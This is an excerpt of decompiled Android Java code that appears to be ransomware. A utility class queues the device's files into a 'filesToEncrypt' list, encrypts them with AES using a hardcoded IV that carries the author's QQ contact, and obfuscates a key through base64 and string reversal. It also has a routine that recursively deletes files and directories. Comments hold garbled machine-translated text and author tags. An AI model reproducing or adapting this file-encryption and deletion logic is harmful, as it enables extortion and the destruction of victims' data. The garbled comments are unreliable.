...
public class MainActivity_Utils {
    ...
    //Xoa danh muc lien quan toi File => E 〱 tối
            ...
            for (final File file2 : fileArr) {
                ...
                if (i == 0) {
                            ...
                            executorService.execute(new Runnable() {
                                @Override public void run() {
                                    if (file2.getName().contains("!\uff01" + MainActivity.hz)) {
                                        ...
                                        MainActivity_Utils.jj(file2, str, i);
                                    }
                                    MainActivity_Utils.aa++;
                                    if (MainActivity_Utils.filesToEncrypt.size() <= MainActivity_Utils.aa) {
                                        MainActivity_Utils.aa = 0;
                                        MainActivity_Utils.filesToEncrypt = new ArrayList();
                                        Editor edit = context.getSharedPreferences("XH", 0).edit();
                                        edit.putInt("cjk", 1);
                                        edit.commit();
                                        MainActivity.instance.finish();
                    ...
                    executorService.execute(new Runnable() {
                        @Override public void run() {
                            MainActivity_Utils.jj(file2, str, i);
                            MainActivity_Utils.hh++;

                            if (MainActivity_Utils.bb == MainActivity_Utils.hh && MainActivity_Utils.flag) {
                                Editor edit = context.getSharedPreferences("XH", 0).edit();
                                edit.putInt("sss", 1);
                                edit.commit();
                                MainActivity.instance.finish();
    ...
    *  Sông Sansei đá => \u4e09\u751f\u77f3\u7554
    *  Bana mở => \u5f7c\u5cb8\u82b1\u5f00
    * E 㕦 㝣 E 㕣 Kobe E 㠲 Hồ
    * E 㑥 〹 E 㜵 ㅦ E 㜷 Yie 㜵 㔴
    * E 㕦 㝣 E 㕣 Kobe E 㠲 Huế 㕦 〰
    * E 㑥 〹 E 㜵 ㅦ E 㜷 Yie 㜵 㔴
    * E 㕦 㝣 E 㕣 Kobe E 㠲 Huế 㕦 〰
    * by: tr33t-hacker:*2EF648BCADA97D72517978AC7C7F3A321C1D5013
    * */
    public static final String getbah(String str) {
        String str2 = new String(Base64.encode("by:TI\u7684\u8D77\u6E90 qq:1211244773".getBytes(), 0));
        ...
        return new String(Base64.encode(
                (String.valueOf(new StringBuffer(new String(Base64.encode(str.getBytes(), 0))).reverse())
                        + BuildConfig.VERSION_NAME).getBytes(), 0)).replaceAll(str3, "\u4ECE\u4E00\u4E2A\u5C0F\u57CE\u9547\u9ED1\u5BA2\u6765\u4E86")
                .replaceAll(str2, "\u5305\u5DF2\u7ECF\u4ECE\u6E90\u516C\u53F8\u5F00\u4E1A\u3002")
                .replaceAll("\u4ECE\u4E00\u4E2A\u5C0F\u57CE\u9547\u9ED1\u5BA2\u6765\u4E86", str2)
                .replaceAll("\u5305\u5DF2\u7ECF\u4ECE\u6E90\u516C\u53F8\u5F00\u4E1A\u3002", str3);
    }
    ...
    private static Cipher initAESCipher(String str, int i) {
        ...
        try {
            AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec("TI:qq 1211244773 ".getBytes());
    ...
    /*E 㑥 〹 E 㜵 ㅦ E 㜷 Yie 㜵 㔴 ⁜ điện On Không hài lòng với sức mạnh bộ chuyển đổi điện là 㡜 Austin ㉢ ㅜ
    * Sansei đá sông Bana mở => \u4e09\u751f\u77f3\u7554 \u5f7c\u5cb8\u82b1\u5f00
    *
    * */
    public static String l(String str) {
        int i = 0;
        String replaceAll =
                Base64.encodeToString("\u4ECE\u4E00\u4E2A\u5C0F\u57CE\u9547\u9ED1\u5BA2\u6765\u4E86\u5305\u5DF2\u7ECF\u4ECE\u6E90\u516C\u53F8\u5F00\u4E1A\u3002".getBytes(), 0)
    ...
    * */
    public static void deleteFile(final File file) {
        new Thread(new Runnable() {
            @Override public void run() {
                if (!file.getName().contains("\u5305\u5DF2\u7ECF\u4ECE\u6E90\u516C\u53F8\u5F00\u4E1A\u3002")) {
                    if (file.isFile()) {
                        file.delete();
                    } else if (file.isDirectory()) {
                        ...
                        for (File sc : listFiles) {
                            MainActivity_Utils.deleteFile(sc);
                        }
                        file.delete();
                    }
                }
